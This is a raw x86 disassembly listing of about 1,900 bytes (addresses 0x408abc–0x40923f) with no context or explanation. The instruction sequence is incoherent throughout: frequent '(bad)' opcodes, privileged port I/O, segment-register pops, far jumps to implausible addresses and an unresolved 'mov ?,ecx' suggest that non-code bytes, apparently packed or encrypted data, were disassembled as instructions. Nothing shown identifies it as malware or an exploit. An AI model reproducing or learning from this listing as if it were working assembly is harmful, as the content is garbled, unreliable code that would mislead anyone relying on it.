  408abc:	in     al,0x9b
  408abe:	xchg   ebx,edi
  408ac0:	cmp    BYTE PTR [edi-0x46cb2c4e],cl
  408ac6:	repnz mov DWORD PTR [esi+0x71],eax
  408aca:	cmove  ecx,DWORD PTR [edi+0x1a367b6a]
  408ad1:	scas   eax,DWORD PTR es:[edi]
  408ad2:	or     al,0xc2
  408ad4:	bound  eax,QWORD PTR ds:0x52d86bff
  408ada:	ret    
  408adb:	and    cl,BYTE PTR [esi-0x18]
  408ade:	adc    DWORD PTR [ebx+0x66],edx
  408ae1:	dec    ebp
  408ae2:	out    dx,eax
  408ae3:	add    DWORD PTR [esi+0x667f500],esi
  408ae9:	cmp    dh,0xb8
  408aec:	es rol ah,cl
  408aef:	out    0xb,eax
  408af1:	pop    edi
  408af2:	fcomp  QWORD PTR [edi]
  408af4:	ins    DWORD PTR es:[edi],dx
  408af5:	sar    DWORD PTR [esi+0xb12c6c3],0x4b
  408afc:	jo     0x408b77
  408afe:	xor    dl,bl
  408b00:	xchg   esp,eax
  408b01:	es test ebx,edi
  408b04:	jl     0x408aa7
  408b06:	cli    
  408b07:	shr    cl,1
  408b09:	push   cs
  408b0a:	xor    ah,BYTE PTR [edi+0x3c570cc]
  408b10:	adc    BYTE PTR [ebp-0x75],dl
  408b13:	pop    ds
  408b14:	les    ecx,FWORD PTR [ebx-0x4e0d9ee3]
  408b1a:	or     ecx,edi
  408b1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b1d:	fs repnz dec ecx
  408b20:	cmp    eax,0x1cb0ca63
  408b26:	push   0xffffff9c
  408b28:	and    ecx,DWORD PTR [edi-0x1f]
  408b2b:	pusha  
  408b2c:	mov    bh,0xba
  408b2e:	jne    0x408ad7
  408b30:	pop    DWORD PTR [ebx]
  408b32:	(bad)
  408b35:	jmp    0xb6b5e421
  408b3a:	sahf   
  408b3b:	xchg   DWORD PTR [esi-0x5e],ebx
  408b3e:	les    eax,FWORD PTR [edi+0x49]
  408b41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b42:	pop    esi
  408b43:	in     eax,0x1c
  408b45:	xor    DWORD PTR [esi+ebx*1],0xffffff90
  408b49:	(bad)  [edx-0x3f0c1f80]
  408b4f:	inc    edi
  408b50:	xchg   ebp,eax
  408b51:	and    ebp,DWORD PTR [ebp-0x108f3fde]
  408b57:	cmp    DWORD PTR [ebx],ebp
  408b59:	xchg   ebx,eax
  408b5a:	repz mov ds:0x5da9494b,eax
  408b60:	inc    eax
  408b61:	rcr    BYTE PTR [ecx+0x10e4cd02],1
  408b67:	dec    DWORD PTR [eax+0x586b53a4]
  408b6d:	call   0x4d160c2b
  408b72:	scas   al,BYTE PTR es:[edi]
  408b73:	mov    cl,0xbf
  408b75:	sahf   
  408b76:	pop    ds
  408b77:	lea    edi,[esi+0x43a76f1d]
  408b7d:	sub    al,0x49
  408b7f:	dec    edi
  408b80:	js     0x408bcc
  408b82:	ins    BYTE PTR es:[edi],dx
  408b83:	push   ss
  408b84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b85:	jbe    0x408b6d
  408b87:	test   ecx,0xefc0edf0
  408b8d:	push   esi
  408b8e:	pop    es
  408b8f:	push   0x21433a3d
  408b94:	push   0xd
  408b96:	push   ds
  408b97:	pop    edi
  408b98:	jb     0x408b88
  408b9a:	daa    
  408b9b:	adc    eax,0xa1bde3cb
  408ba0:	push   0xffffffc2
  408ba2:	dec    ebp
  408ba3:	daa    
  408ba4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ba5:	std    
  408ba6:	sahf   
  408ba7:	outs   dx,BYTE PTR ds:[esi]
  408ba8:	mov    al,0x16
  408baa:	cmc    
  408bab:	out    0xa0,eax
  408bad:	pop    ss
  408bae:	int    0x42
  408bb0:	sbb    cl,0x89
  408bb3:	jle    0x408bb4
  408bb5:	mov    ecx,0x4448d097
  408bba:	adc    DWORD PTR [edi+0x699c194c],0xffffffbb
  408bc1:	fist   WORD PTR [ebx+0x1776acb8]
  408bc7:	fist   WORD PTR [edi]
  408bc9:	sub    bh,dl
  408bcb:	adc    BYTE PTR [ecx+0x73],bh
  408bce:	sbb    eax,0x3f822e6
  408bd3:	sub    ebx,edi
  408bd5:	test   BYTE PTR [esi-0x752059dc],cl
  408bdb:	push   0xb8077f03
  408be0:	lods   eax,DWORD PTR ds:[esi]
  408be1:	mov    ds:0xd8c6aaf8,al
  408be6:	cmp    BYTE PTR [ecx],bl
  408be8:	imul   eax,DWORD PTR [ecx+0x2b],0xac3c2c5f
  408bef:	(bad)  
  408bf0:	xor    eax,0x2d7b7a9a
  408bf5:	fsubr  QWORD PTR [ebp-0x6f]
  408bf8:	fidiv  DWORD PTR [eax-0x53]
  408bfb:	shl    DWORD PTR [ebp+0x65c1a38b],1
  408c01:	mov    al,ah
  408c03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c04:	bound  esi,QWORD PTR [esi]
  408c06:	dec    edi
  408c07:	xchg   edx,eax
  408c08:	mov    dl,0x16
  408c0a:	outs   dx,DWORD PTR ds:[esi]
  408c0b:	cmp    DWORD PTR [eax-0x2e165f2a],esi
  408c11:	sbb    eax,0xc88c00a
  408c16:	cld    
  408c17:	mov    dh,0xaf
  408c19:	xor    dh,ch
  408c1b:	cmp    BYTE PTR [edx],al
  408c1d:	pop    ss
  408c1e:	div    ecx
  408c20:	jo     0x408c9a
  408c22:	add    eax,0x31ec884
  408c27:	sbb    sp,WORD PTR [eax+0x3a]
  408c2b:	sub    al,0x98
  408c2d:	in     al,dx
  408c2e:	call   0xcca3:0x8e852777
  408c35:	push   edi
  408c36:	arpl   di,ax
  408c38:	iret   
  408c39:	mov    ds:0xd0cbff7e,al
  408c3e:	dec    eax
  408c3f:	sub    dl,BYTE PTR [edx-0x722b3e61]
  408c45:	xchg   BYTE PTR [eax-0x7c],cl
  408c48:	fnstcw WORD PTR [edi+0x240b452b]
  408c4e:	fdivrp st(6),st
  408c50:	adc    al,0x44
  408c52:	sbb    ch,al
  408c54:	push   edx
  408c55:	jmp    0x313b:0xa1d66dbd
  408c5c:	inc    ecx
  408c5d:	sub    bl,cl
  408c5f:	imul   eax,DWORD PTR [ebx+0x60cd2489],0x48
  408c66:	mov    edx,0xd473c2eb
  408c6b:	dec    ebx
  408c6c:	imul   ebx,DWORD PTR [ecx+0x37],0x8
  408c70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c71:	(bad)  
  408c72:	or     BYTE PTR [edx+0x3],dl
  408c75:	push   edi
  408c76:	out    0x35,eax
  408c78:	stc    
  408c79:	mov    ch,0xd4
  408c7b:	test   al,0xb1
  408c7d:	enter  0x3cc6,0xc1
  408c81:	test   DWORD PTR [edx],ecx
  408c83:	mov    al,0x7a
  408c85:	pop    esp
  408c86:	push   edi
  408c87:	sahf   
  408c88:	aam    0xd
  408c8a:	cmp    BYTE PTR [ebx+0x17],al
  408c8d:	xchg   edi,eax
  408c8e:	sbb    DWORD PTR [edi+0x65],ecx
  408c91:	sbb    DWORD PTR [ecx-0x46a129c3],eax
  408c97:	fdiv   QWORD PTR [eax+0x7a929c7]
  408c9d:	mov    edx,DWORD PTR [ebx]
  408c9f:	mov    bl,0x5
  408ca1:	jae    0x408c52
  408ca3:	push   es
  408ca4:	dec    edx
  408ca5:	jg     0x408c6c
  408ca7:	fnstsw WORD PTR cs:0xad8633d
  408cae:	mov    ds:0x53264951,eax
  408cb3:	out    dx,al
  408cb4:	repz lds eax,FWORD PTR [eax-0x336fb149]
  408cbb:	jg     0x408cee
  408cbd:	into   
  408cbe:	jns    0x408c75
  408cc0:	xor    eax,0xa0d60c4e
  408cc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cc6:	jmp    ebx
  408cc8:	dec    ebx
  408cc9:	es dec esi
  408ccb:	nop
  408ccc:	pop    esi
  408ccd:	or     ch,BYTE PTR [ebx+0x4f]
  408cd0:	fist   DWORD PTR [esi+0x2604258a]
  408cd6:	add    dh,BYTE PTR [edx]
  408cd8:	fimul  WORD PTR [ecx-0x5bd1c720]
  408cde:	cmp    al,0x79
  408ce0:	mov    esi,cs
  408ce2:	ret    0x6550
  408ce5:	mov    eax,ds:0x6df76c4c
  408cea:	cmp    edx,DWORD PTR [ecx+0x2c0512b8]
  408cf0:	(bad)  
  408cf1:	rol    DWORD PTR [ebx],cl
  408cf3:	pop    eax
  408cf4:	(bad)  
  408cf5:	in     al,0xca
  408cf7:	jge    0x408d4b
  408cf9:	jmp    0x3758:0xf33256b1
  408d00:	nop
  408d01:	imul   ebp,DWORD PTR [ebp+eax*8-0x12],0xffffff84
  408d06:	or     eax,0xd1d085b
  408d0b:	or     bl,BYTE PTR ss:[edi-0x58]
  408d0f:	icebp  
  408d10:	add    cl,cl
  408d12:	das    
  408d13:	and    eax,0xea80886c
  408d18:	test   esi,eax
  408d1a:	jnp    0x408d78
  408d1c:	mov    WORD PTR [edi],ds
  408d1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d1f:	xlat   BYTE PTR ds:[ebx]
  408d20:	jle    0x408cc9
  408d22:	jecxz  0x408d9c
  408d24:	stos   DWORD PTR es:[edi],eax
  408d25:	pop    es
  408d26:	fld    DWORD PTR [ebx+0x77]
  408d29:	cmp    al,0xd8
  408d2b:	mov    esi,0xeeb1b592
  408d30:	jecxz  0x408cba
  408d32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d33:	mov    esp,DWORD PTR [edi]
  408d35:	dec    ecx
  408d36:	pop    ds
  408d37:	xor    al,0x7f
  408d39:	push   0xffffff97
  408d3b:	ret    
  408d3c:	xchg   esi,eax
  408d3d:	popa   
  408d3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d3f:	mov    ch,0x6f
  408d41:	adc    al,BYTE PTR [eax-0x527092c7]
  408d47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d48:	ss ins BYTE PTR es:[edi],dx
  408d4a:	or     DWORD PTR [edx],ebp
  408d4c:	mov    eax,ds:0x8aeac7ea
  408d51:	add    dh,bl
  408d53:	push   0x752fb2f
  408d58:	xlat   BYTE PTR ds:[ebx]
  408d59:	add    DWORD PTR [esi+0x21],eax
  408d5c:	int    0x29
  408d5e:	push   0x19
  408d60:	stc    
  408d61:	adc    al,0x1f
  408d63:	jecxz  0x408d69
  408d65:	dec    ecx
  408d66:	scas   eax,DWORD PTR es:[edi]
  408d67:	stc    
  408d68:	xchg   esp,eax
  408d69:	lahf   
  408d6a:	test   BYTE PTR [edx],al
  408d6c:	mov    bh,0x64
  408d6e:	data16 fst QWORD PTR ds:0x179a34b8
  408d75:	ret    
  408d76:	xchg   BYTE PTR [edx],bl
  408d78:	(bad)  
  408d79:	jle    0x408d31
  408d7b:	and    DWORD PTR [edx-0x5cd257c2],0xe65e54c
  408d85:	cs inc edx
  408d87:	cs jns 0x408df3
  408d8a:	ficom  DWORD PTR [eax+0x2e]
  408d8d:	lahf   
  408d8e:	leave  
  408d8f:	jnp    0x408d94
  408d91:	and    eax,DWORD PTR [eax]
  408d93:	jge    0x408d63
  408d95:	shl    DWORD PTR [edi-0x2f],0xa9
  408d99:	aaa    
  408d9a:	or     ecx,edi
  408d9c:	lods   eax,DWORD PTR ds:[esi]
  408d9d:	add    eax,0xcf493895
  408da2:	adc    esi,DWORD PTR [esi+0x2e]
  408da5:	dec    ebx
  408da6:	cs call 0xd5a2:0xf41dfe2b
  408dae:	test   BYTE PTR [esi-0x471303bc],bl
  408db4:	mov    ebp,0xa08cc45a
  408db9:	iret   
  408dba:	xchg   esi,eax
  408dbb:	jnp    0x408d41
  408dbd:	cwde   
  408dbe:	inc    ebp
  408dbf:	lahf   
  408dc0:	fbstp  TBYTE PTR [ebp-0x61]
  408dc3:	pop    es
  408dc4:	sub    ebx,DWORD PTR [ebx]
  408dc6:	or     al,0x32
  408dc8:	nop
  408dc9:	arpl   WORD PTR [esi-0x2f],bx
  408dcc:	ret    0x6b4a
  408dcf:	mov    BYTE PTR [esi-0x1c],bh
  408dd2:	daa    
  408dd3:	xor    al,BYTE PTR [edi-0xeb466e4]
  408dd9:	xchg   esi,eax
  408dda:	inc    esp
  408ddb:	pop    esi
  408ddc:	aad    0x5f
  408dde:	repz add eax,DWORD PTR [edx]
  408de1:	in     eax,0x71
  408de3:	lods   al,BYTE PTR ds:[esi]
  408de4:	lahf   
  408de5:	mov    ds,WORD PTR [ebp-0x1afd434f]
  408deb:	or     al,0xb7
  408ded:	(bad)
  408df0:	dec    ecx
  408df1:	push   ebp
  408df2:	out    dx,al
  408df3:	or     eax,DWORD PTR [edi+0x26a09dd6]
  408df9:	lock dec esi
  408dfb:	dec    ecx
  408dfc:	dec    ebx
  408dfd:	push   ecx
  408dfe:	inc    esi
  408dff:	mov    BYTE PTR [eax],cl
  408e01:	pop    ebp
  408e02:	jno    0x408e6f
  408e04:	mov    cl,0x1b
  408e06:	sbb    al,0xa1
  408e08:	pop    es
  408e09:	mov    dh,0x5d
  408e0b:	imul   edi,DWORD PTR [ebp-0x6f],0x264dedc4
  408e12:	sub    edx,DWORD PTR [ecx-0x11]
  408e15:	push   edx
  408e16:	xchg   esp,eax
  408e17:	aam    0x81
  408e19:	enter  0x840d,0x1f
  408e1d:	sbb    eax,0x5dc3c53
  408e22:	mov    esi,0xae6e58d8
  408e27:	cwde   
  408e28:	je     0x408e22
  408e2a:	pop    ds
  408e2b:	aaa    
  408e2c:	add    edi,edi
  408e2e:	imul   esp
  408e30:	loopne 0x408df9
  408e32:	imul   ecx,ecx,0x60
  408e35:	pop    ebx
  408e36:	fimul  DWORD PTR [ebp-0x17e12e9f]
  408e3c:	cmp    ebp,DWORD PTR [ecx]
  408e3e:	pusha  
  408e3f:	sub    dh,BYTE PTR [eax-0xa934251]
  408e45:	shl    BYTE PTR [edi],cl
  408e47:	jnp    0x408e24
  408e49:	or     al,BYTE PTR [ebx-0x35f2e28b]
  408e4f:	das    
  408e50:	pop    ebp
  408e51:	xchg   DWORD PTR [ebx+0x1ea58984],ebx
  408e57:	and    ebx,DWORD PTR [esi+eax*2+0x26c21a24]
  408e5e:	(bad)  [ebp-0x6976c71b]
  408e64:	aad    0xc1
  408e66:	lock out dx,eax
  408e68:	mov    ecx,0x75931c7e
  408e6d:	mov    edx,0x78d57477
  408e72:	push   edx
  408e73:	fwait
  408e74:	jecxz  0x408e5c
  408e76:	xchg   BYTE PTR [edx-0x710b2443],ch
  408e7c:	out    0x2c,al
  408e7e:	test   bl,0xd1
  408e81:	mov    ah,0xb9
  408e83:	in     eax,0x37
  408e85:	aaa    
  408e86:	in     eax,0x3
  408e88:	lods   al,BYTE PTR ds:[esi]
  408e89:	ins    BYTE PTR es:[edi],dx
  408e8a:	mov    ds:0x7cac2200,eax
  408e8f:	gs mov ch,bh
  408e92:	cmp    BYTE PTR [esi],bl
  408e94:	jg     0x408e25
  408e96:	mov    ah,0x28
  408e98:	lahf   
  408e99:	mov    bl,dl
  408e9b:	pop    edx
  408e9c:	stos   BYTE PTR es:[edi],al
  408e9d:	cwde   
  408e9e:	pop    ds
  408e9f:	push   esi
  408ea0:	add    eax,ecx
  408ea2:	or     BYTE PTR [edi],al
  408ea4:	pop    ds
  408ea5:	mov    edi,0x161f09c0
  408eaa:	popf   
  408eab:	cmp    DWORD PTR [ecx-0x25],ebp
  408eae:	out    0xef,eax
  408eb0:	addr16 and eax,0xab095148
  408eb6:	stos   DWORD PTR es:[edi],eax
  408eb7:	xor    bl,BYTE PTR [esi-0x69]
  408eba:	pusha  
  408ebb:	(bad)  
  408ebc:	pop    edi
  408ebd:	and    ebx,DWORD PTR [edi]
  408ebf:	gs clc 
  408ec1:	xor    esp,DWORD PTR [ebx+0x53]
  408ec4:	daa    
  408ec5:	jge    0x408eaf
  408ec7:	ret    
  408ec8:	sahf   
  408ec9:	js     0x408f20
  408ecb:	outs   dx,DWORD PTR ds:[esi]
  408ecc:	psllw  mm0,QWORD PTR [esi]
  408ecf:	jmp    0x408eca
  408ed1:	mov    ds:0x3ab19f1d,al
  408ed6:	icebp  
  408ed7:	push   ebx
  408ed8:	daa    
  408ed9:	clc    
  408eda:	cmp    al,0xa5
  408edc:	jmp    FWORD PTR [ebx+0x66e42fec]
  408ee2:	mov    WORD PTR ds:0x841a8c59,gs
  408ee8:	cwde   
  408ee9:	iret   
  408eea:	pop    ds
  408eeb:	sbb    al,0x92
  408eed:	sbb    dh,BYTE PTR ds:0x4f56d269
  408ef3:	outs   dx,DWORD PTR ds:[esi]
  408ef4:	cmp    dl,BYTE PTR [ecx+0x36]
  408ef7:	leave  
  408ef8:	mov    ds:0x5bc5ec59,al
  408efd:	add    BYTE PTR [edx+eiz*2],dh
  408f00:	jmp    0xe49e0ae2
  408f05:	loopne 0x408e8a
  408f07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f08:	(bad)  
  408f09:	or     BYTE PTR [eax+ebp*8],dl
  408f0c:	aas    
  408f0d:	mov    edi,0xab2161ab
  408f12:	add    al,0xb7
  408f14:	mov    ?,ecx
  408f16:	jl     0x408eca
  408f18:	je     0x408efc
  408f1a:	(bad)  
  408f1b:	mov    ds:0x146123ed,al
  408f20:	addr16 lahf 
  408f22:	in     eax,dx
  408f23:	(bad)  
  408f24:	div    BYTE PTR [ecx+0x2f]
  408f27:	retf   0xf873
  408f2a:	mov    bl,0xf7
  408f2c:	add    ah,BYTE PTR [edx-0x6b873494]
  408f32:	inc    edx
  408f33:	nop
  408f34:	and    edi,DWORD PTR [eax]
  408f36:	(bad)  
  408f37:	rol    BYTE PTR [edx],1
  408f39:	out    0xf2,al
  408f3b:	and    DWORD PTR ds:0x2112c5bf,ebx
  408f41:	xchg   edx,eax
  408f42:	pop    es
  408f43:	or     al,0xd0
  408f45:	inc    ecx
  408f46:	fldenv [eax]
  408f48:	adc    DWORD PTR [eax+0x4c],eax
  408f4b:	add    DWORD PTR [esi],edi
  408f4d:	ins    BYTE PTR es:[edi],dx
  408f4e:	add    cl,dh
  408f50:	ds mov eax,0xca360904
  408f56:	xchg   ebp,eax
  408f57:	aam    0x69
  408f59:	sub    ebx,DWORD PTR [edi-0x5365c3e]
  408f5f:	inc    eax
  408f60:	add    esp,DWORD PTR [edx+0x6f]
  408f63:	into   
  408f64:	hlt    
  408f65:	ret    
  408f66:	mov    esi,0x9afc01a9
  408f6b:	imul   edx,DWORD PTR [edi-0x28],0xffffffbc
  408f6f:	mov    cs,WORD PTR [edx+0x2a90b4dc]
  408f75:	imul   esp,ebx,0xd046599
  408f7b:	inc    eax
  408f7c:	sbb    ecx,DWORD PTR [esi+0x2b2a133e]
  408f82:	or     ebx,esp
  408f84:	inc    esi
  408f85:	(bad)  [esi-0x6070f755]
  408f8b:	or     dh,al
  408f8d:	cs adc al,0xbf
  408f90:	loope  0x408fb7
  408f92:	sbb    BYTE PTR [ecx-0x7460a9bc],cl
  408f98:	aad    0xb5
  408f9a:	push   ds
  408f9b:	daa    
  408f9c:	pop    es
  408f9d:	jge    0x408f8d
  408f9f:	dec    edx
  408fa0:	sub    DWORD PTR [edi+ebp*4+0x413a81ae],eax
  408fa7:	leave  
  408fa8:	sub    edi,esi
  408faa:	popf   
  408fab:	adc    BYTE PTR [ebp+0x34996a3c],0xd6
  408fb2:	scas   al,BYTE PTR es:[edi]
  408fb3:	into   
  408fb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fb5:	fwait
  408fb6:	int3   
  408fb7:	sub    esp,ecx
  408fb9:	jns    0x408feb
  408fbb:	add    al,BYTE PTR [eax-0x257825d5]
  408fc1:	outs   dx,DWORD PTR ds:[esi]
  408fc2:	je     0x408f68
  408fc4:	push   0x8b53b5ed
  408fc9:	loope  0x409005
  408fcb:	pop    ds
  408fcc:	inc    esi
  408fcd:	fld    TBYTE PTR [esi+0x24]
  408fd0:	jnp    0x408fc2
  408fd2:	stos   BYTE PTR es:[edi],al
  408fd3:	aas    
  408fd4:	into   
  408fd5:	or     al,0xa5
  408fd7:	out    0x85,eax
  408fd9:	inc    ebp
  408fda:	shl    BYTE PTR [eax],cl
  408fdc:	adc    cl,BYTE PTR [esi-0x32ea0273]
  408fe2:	test   eax,0xd23d9136
  408fe7:	push   eax
  408fe8:	cmp    BYTE PTR [edx],dh
  408fea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408feb:	jl     0x408ffa
  408fed:	mov    edi,0xaae2afb
  408ff2:	int3   
  408ff3:	(bad)  
  408ff4:	jmp    0x2c4bec59
  408ff9:	mov    edi,0xc46f5a28
  408ffe:	arpl   WORD PTR [edx],bx
  409000:	imul   edx,ebx,0xc4a28cd4
  409006:	repz dec ebp
  409008:	shl    BYTE PTR [ebx-0x5],cl
  40900b:	retf   
  40900c:	lahf   
  40900d:	or     edi,eax
  40900f:	call   0x5ce18da0
  409014:	xchg   edi,eax
  409015:	shr    DWORD PTR [ebx],0x96
  409018:	push   edx
  409019:	sbb    al,0x6a
  40901b:	xor    al,0x2c
  40901d:	pop    esi
  40901e:	fsubr  st,st(6)
  409020:	inc    edi
  409021:	scas   al,BYTE PTR es:[edi]
  409022:	loope  0x408fc5
  409024:	test   al,0x6f
  409026:	add    eax,0xe0f4bead
  40902b:	jb     0x40902b
  40902d:	sti    
  40902e:	mov    ds:0xccf03b80,al
  409033:	dec    edi
  409034:	xor    edx,DWORD PTR [edx+0x79]
  409037:	fst    DWORD PTR [eax+0x3b]
  40903a:	ror    DWORD PTR [eax+0x19f2eb3c],cl
  409040:	out    dx,eax
  409041:	fcomp  st(2)
  409043:	sub    al,dl
  409045:	push   edi
  409046:	dec    esi
  409047:	sub    cl,0x45
  40904a:	cmp    BYTE PTR ds:0x38d641de,dh
  409050:	add    bl,bl
  409052:	(bad)  
  409053:	sti    
  409054:	fwait
  409055:	jmp    DWORD PTR [ebx+0x3acd9679]
  40905b:	pop    ds
  40905c:	rep stos BYTE PTR es:[edi],al
  40905e:	mov    edx,0xa6e6f334
  409063:	push   ecx
  409064:	pop    ds
  409065:	mul    DWORD PTR [edx-0x395d66df]
  40906b:	add    eax,0x4d1d3a8c
  409070:	adc    al,0x57
  409072:	loope  0x409077
  409074:	pop    ds
  409075:	dec    esi
  409076:	push   ss
  409077:	outs   dx,DWORD PTR ds:[esi]
  409078:	sahf   
  409079:	addr16 dec edi
  40907b:	shl    ebx,0xbd
  40907e:	je     0x4090c2
  409080:	out    dx,al
  409081:	jecxz  0x40900b
  409083:	pop    ebx
  409084:	fdiv   st,st(5)
  409086:	and    ax,0x3c6a
  40908a:	loope  0x40907b
  40908c:	jp     0x409094
  40908e:	jmp    0x7e39:0xd20b5074
  409095:	or     esp,ebp
  409097:	(bad)  
  409098:	dec    ebx
  409099:	xchg   ecx,eax
  40909a:	aad    0x86
  40909c:	js     0x409112
  40909e:	add    eax,0x7622a005
  4090a3:	and    eax,0x9365bf41
  4090a8:	inc    esp
  4090a9:	dec    edi
  4090aa:	jecxz  0x40911d
  4090ac:	idiv   BYTE PTR [ecx+0x491622fb]
  4090b2:	loopne 0x4090e9
  4090b4:	cmp    DWORD PTR [ebx],edi
  4090b6:	sti    
  4090b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090b8:	inc    esi
  4090b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090ba:	adc    eax,0x4fbffeef
  4090bf:	inc    esp
  4090c0:	cwde   
  4090c1:	push   ecx
  4090c2:	arpl   WORD PTR [ecx-0x4bcb2d09],bp
  4090c8:	ret    
  4090c9:	xlat   BYTE PTR ds:[ebx]
  4090ca:	dec    edx
  4090cb:	cmp    bh,BYTE PTR [eax-0x5d4670ca]
  4090d1:	adc    esp,DWORD PTR [esi+edi*4-0x19]
  4090d5:	dec    edi
  4090d6:	mov    ah,0x4
  4090d8:	jecxz  0x409118
  4090da:	aad    0x1e
  4090dc:	cmp    BYTE PTR [ecx+0x60bff3b9],cl
  4090e2:	pop    ebp
  4090e3:	(bad)  
  4090e4:	push   ds
  4090e5:	pushf  
  4090e6:	mov    bh,0x25
  4090e8:	stos   DWORD PTR es:[edi],eax
  4090e9:	cmp    bh,bl
  4090eb:	jl     0x4090a1
  4090ed:	mov    BYTE PTR [eax+0x7b],ch
  4090f0:	mov    ah,BYTE PTR [ecx+edx*4+0x6a]
  4090f4:	inc    ebp
  4090f5:	aas    
  4090f6:	ins    BYTE PTR es:[edi],dx
  4090f7:	xor    bh,cl
  4090f9:	fld    st(7)
  4090fb:	push   edi
  4090fc:	scas   al,BYTE PTR es:[edi]
  4090fd:	jnp    0x4090e2
  4090ff:	cdq    
  409100:	jae    0x409131
  409102:	xor    edx,DWORD PTR [eax+eax*1-0xa20dc4e]
  409109:	stos   DWORD PTR es:[edi],eax
  40910a:	fucomp st(1)
  40910c:	fnstcw WORD PTR [ecx]
  40910e:	lods   al,BYTE PTR ds:[esi]
  40910f:	pusha  
  409110:	icebp  
  409111:	mov    bh,0x43
  409113:	dec    edx
  409114:	jne    0x409162
  409116:	lods   eax,DWORD PTR ds:[esi]
  409117:	mov    DWORD PTR [ebx],esi
  409119:	popa   
  40911a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40911b:	sahf   
  40911c:	adc    ecx,DWORD PTR [esi]
  40911e:	ins    BYTE PTR es:[edi],dx
  40911f:	cld    
  409120:	bound  esp,QWORD PTR [edi]
  409122:	cmp    DWORD PTR [esi-0x53],edi
  409125:	jp     0x4090ff
  409127:	fild   DWORD PTR [edi+ebx*1]
  40912a:	call   0xb8eebcf2
  40912f:	inc    ebp
  409130:	pop    ecx
  409131:	pusha  
  409132:	mov    ds:0xb206cf0a,eax
  409137:	adc    eax,0x53bd4e24
  40913c:	push   ds
  40913d:	mov    DWORD PTR [ecx+0x7],edi
  409140:	cmc    
  409141:	data16 lahf 
  409143:	mov    esi,0x942d9e9b
  409148:	dec    edi
  409149:	xchg   BYTE PTR [edx-0x2df52120],bh
  40914f:	stos   DWORD PTR es:[edi],eax
  409150:	cli    
  409151:	sub    al,0x38
  409153:	cmp    ebx,DWORD PTR [edx]
  409155:	mov    ebp,0xb457a074
  40915a:	fstp   TBYTE PTR [esi]
  40915c:	dec    ecx
  40915d:	retf   
  40915e:	pop    ebx
  40915f:	sub    edx,eax
  409161:	mov    BYTE PTR [ecx+0x3],dl
  409164:	div    BYTE PTR ds:0x9d946714
  40916a:	mov    WORD PTR [ebx-0x4a],es
  40916d:	sub    al,BYTE PTR [esi]
  40916f:	loope  0x4090f4
  409171:	enter  0xb8ee,0xdc
  409175:	jns    0x409148
  409177:	add    DWORD PTR [eax],edi
  409179:	imul   ebx,esi,0xf00a27ae
  40917f:	mov    dl,0x11
  409181:	fwait
  409182:	sub    ebx,0xffffffd2
  409185:	pushf  
  409186:	dec    eax
  409187:	xor    ecx,edi
  409189:	mov    esi,0xee41a46a
  40918e:	mov    bh,0x62
  409190:	sub    dl,BYTE PTR [ebx-0x26]
  409193:	mov    dh,0x40
  409195:	call   0xe54d:0x78dd047c
  40919c:	mov    ebp,0xc0a95369
  4091a1:	ins    BYTE PTR es:[edi],dx
  4091a2:	dec    edi
  4091a3:	dec    ebx
  4091a4:	xchg   esi,eax
  4091a5:	fstp   TBYTE PTR [ebx+0x56]
  4091a8:	or     al,0x5f
  4091aa:	stc    
  4091ab:	jne    0x40922c
  4091ad:	xchg   esp,eax
  4091ae:	ds out 0x9c,eax
  4091b1:	enter  0x8ccd,0x34
  4091b5:	mov    ecx,0x4a22bee6
  4091ba:	cmc    
  4091bb:	xor    BYTE PTR [eax+0x2abe4f29],0x26
  4091c2:	xchg   esi,eax
  4091c3:	add    ecx,DWORD PTR [ecx+0x10]
  4091c6:	adc    eax,0x64a80409
  4091cb:	ret    
  4091cc:	pop    edx
  4091cd:	outs   dx,BYTE PTR ds:[esi]
  4091ce:	call   0x42843d1e
  4091d3:	sbb    eax,0x1ee81cd9
  4091d8:	or     ah,BYTE PTR [edx]
  4091da:	sub    eax,0xbffa05fa
  4091df:	fucomp st(4)
  4091e1:	sub    DWORD PTR [edi+0x20],ebx
  4091e4:	mov    ebp,0xd316bbcf
  4091e9:	outs   dx,BYTE PTR ds:[esi]
  4091ea:	xchg   edx,eax
  4091eb:	dec    edi
  4091ec:	jb     0x40920f
  4091ee:	js     0x409233
  4091f0:	(bad)  
  4091f1:	sub    al,0x14
  4091f3:	cwde   
  4091f4:	jne    0x40917c
  4091f6:	xor    bl,ah
  4091f8:	jo     0x4091c6
  4091fa:	jp     0x40918d
  4091fc:	jle    0x409238
  4091fe:	sbb    ch,BYTE PTR [edi-0x7b07f078]
  409204:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409205:	push   ecx
  409206:	into   
  409207:	cld    
  409208:	xchg   edx,eax
  409209:	jge    0x409191
  40920b:	mov    edx,0x1bcd322c
  409210:	mov    ecx,0xa6282461
  409215:	inc    esi
  409216:	add    ebx,esp
  409218:	add    esp,DWORD PTR [ebp-0x4fd1adb0]
  40921e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40921f:	into   
  409220:	cmp    dh,BYTE PTR [edx+edi*8]
  409223:	mov    esi,0xc3008c0b
  409228:	ins    DWORD PTR es:[edi],dx
  409229:	cmp    al,0xb1
  40922b:	xor    bh,BYTE PTR [ebx-0x50]
  40922e:	mov    bl,0x3a
  409230:	shl    BYTE PTR [esi+0x58c26129],cl
  409236:	out    dx,eax
  409237:	push   ebx
  409238:	fimul  DWORD PTR fs:[edi-0x61]
  40923c:	xchg   DWORD PTR [esi],edi
  40923e:	pop    ebx
  40923f:	sbb    eax,0x8f204bed
